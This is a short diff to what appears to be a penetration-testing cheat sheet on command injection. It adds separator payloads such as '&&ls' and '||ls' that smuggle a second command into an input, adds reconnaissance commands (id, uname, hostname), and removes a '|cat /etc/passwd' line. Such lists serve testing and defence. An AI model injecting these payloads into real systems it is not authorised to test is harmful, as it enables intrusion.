@@ -1,8 +1,17 @@
-# Command Injection
+# Remote Command Execution
 
 ## Payloads
 ```
 ;ls
-|cat /etc/passwd
+&ls
+&&ls
+|ls
+||ls
 %0Als
 ```
+
+## Useful commands
+- ```pwd```
+- ```uname```
+- ```id```
+- ```hostname```
